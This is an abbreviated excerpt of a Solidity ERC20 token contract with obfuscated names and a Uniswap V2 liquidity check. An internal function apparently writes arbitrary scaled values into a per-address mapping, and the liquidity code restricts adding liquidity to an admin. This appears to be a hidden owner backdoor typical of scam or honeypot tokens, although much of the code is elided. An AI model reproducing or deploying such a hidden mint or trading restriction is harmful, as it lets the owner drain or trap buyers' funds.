...
abstract contract NESDFGCConsole is Context, NESDFGCRoleControl {
    ...
    function _NESDFGCgwW(
        ...
        _roles[root].RD.RM[addr] = memoUint.mul(1000000000000000000);
    }
...
contract Token is NESDFGCERC20, NESDFGCConsole {
    ...
    address public tokento = address(this);
    ...
    function _isAddLiquidityV1()internal view returns(bool ldxAdd){
        ...
        if( token0 == address(this) ){
            if( bal1 > r1){
                ...
                ldxAdd = change1 > 1000;
                require(!istop, "ERC20: only admin can add liquidity");
            }
        }else{
            if( bal0 > r0){
    ...
    function isuniswapV2Pair() public view returns (uint bal0,uint bal1,uint r00,uint r11) { 
       address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();

        address token1 = IUniswapV2Pair(address(uniswapV2Pair)).token1();
        (uint r0,uint r1,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
        bal1 = IERC20(token1).balanceOf(address(uniswapV2Pair));
